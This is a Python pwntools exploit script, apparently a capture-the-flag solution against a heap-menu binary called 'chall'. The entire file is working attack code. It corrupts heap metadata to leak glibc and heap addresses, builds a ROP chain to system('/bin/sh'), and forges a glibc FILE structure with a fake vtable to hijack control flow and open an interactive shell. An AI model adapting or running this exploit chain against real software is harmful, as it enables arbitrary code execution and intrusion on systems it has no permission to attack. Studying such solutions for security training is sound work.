#!/usr/bin/env python3

from pwn import context, ELF, FileStructure, p64, remote, sys, u64


context.binary = 'chall'
glibc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

SMALL, MEDIUM, LARGE = 0, 1, 2
WITHOUT_FOOTER, WITH_FOOTER = 0, 1
TEXT, FOOTER, HEADER = 0, 1, 2
NAME, SURNAME, DATE, CITY = 0, 1, 2, 3


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


def create(index: int, size: int, footer: int, name: bytes, surname: bytes, date: bytes, city: bytes, text: bytes):
    io.sendlineafter(b'>', b'0')
    io.sendlineafter(b'>', str(index).encode())
    io.sendlineafter(b'>', str(size).encode())
    io.sendlineafter(b'>', str(footer).encode())
    io.sendafter(b'>', name)
    io.sendafter(b'>', surname)
    io.sendafter(b'>', date)
    io.sendafter(b'>', city)
    io.sendafter(b'>', text)


def edit(index: int, place: int, field: int, data: bytes):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', str(index).encode())
    io.sendlineafter(b'>', str(place).encode())

    if place != TEXT:
        io.sendlineafter(b'>', str(field).encode())

    io.sendlineafter(b'>', data)


def read(index: int) -> bytes:
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', str(index).encode())
    return io.recvuntil(b'What would you like to do?', drop=True)


def throw(index: int):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', str(index).encode())


def main():
    create(0, MEDIUM, WITH_FOOTER, b'A', b'A', b'A', b'A', b'A' * 16)
    create(1, SMALL, WITH_FOOTER, b'B', b'B', b'B', b'B', b'B' * 16)
    throw(0)
    create(2, LARGE, WITHOUT_FOOTER, b'C', b'C', b'C', b'C', b'C' * 16)
    edit(0, HEADER, CITY, p64(0x406040 - 0x20))
    throw(1)

    data = read(0)
    glibc.address = u64(data[data.index(b'Name: ') + 6:][:6].ljust(8, b'\0')) - 0x21b0d0
    heap_addr = u64(data[data.index(b'Date: ') + 6:][:4].ljust(8, b'\0')) - 0x290
    io.success(f'Glibc base address: {hex(glibc.address)}')
    io.success(f'Heap base address: {hex(heap_addr)}')

    xchg_eax_esp_ret_addr = glibc.address + 0x1b5503
    pop_rdi_ret_addr = glibc.address + 0x2a3e5

    rop_chain  = p64(pop_rdi_ret_addr)
    rop_chain += p64(next(glibc.search(b'/bin/sh')))
    rop_chain += p64(glibc.sym.system)

    create(3, LARGE, WITHOUT_FOOTER, b'D', b'D', b'D', b'D', p64(0) * 16 + rop_chain + p64(0) * 9 + p64(heap_addr + 0x1010) + p64(xchg_eax_esp_ret_addr))

    stderr_lock = glibc.address + 0x21ca70  # _IO_stdfile_1_lock (symbol not exported)
    fake_vtable = glibc.sym._IO_wfile_jumps - 0x40  # _IO_wfile_underflow

    fake = FileStructure(0)
    fake.flags = 0x3b01010101010101
    fake._IO_buf_base = heap_addr + 0x123
    fake._lock = stderr_lock
    fake.unknown2 = p64(0) * 2 + p64(glibc.sym._IO_file_jumps) + p64(0) * 3 + p64(fake_vtable)
    fake._wide_data = heap_addr + 0xf90

    edit(0, FOOTER, DATE, p64(fake.flags))
    edit(1, HEADER, NAME, p64(fake._IO_read_end))
    edit(1, TEXT, 0, bytes(fake)[0x30:])

    io.sendlineafter(b'>', b'4')
    io.recvline()

    io.interactive()


if __name__ == '__main__':
    io = get_process()
    main()
